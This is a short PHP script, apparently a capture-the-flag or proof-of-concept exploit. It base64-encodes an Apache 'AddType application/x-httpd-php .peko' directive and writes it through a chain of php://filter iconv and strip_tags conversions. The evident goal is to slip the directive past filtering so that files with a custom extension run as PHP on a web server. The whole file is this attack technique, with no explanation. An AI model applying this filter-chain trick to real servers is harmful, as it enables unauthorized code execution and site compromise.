<?php
$tmpl = file_get_contents("template.html");
$payload = base64_encode('AddType application/x-httpd-php .peko');
$payload = '>' . $payload . '<';
$output = sprintf($tmpl, "time", $payload);
file_put_contents("php://filter/string.strip_tags|convert.iconv.SHIFTJISX0213.UTF16|convert.iconv.852.SHIFTJISX0213|convert.iconv.852.UTF8|convert.iconv.852.UCS2/resource=test.out", $output);
echo $payload;
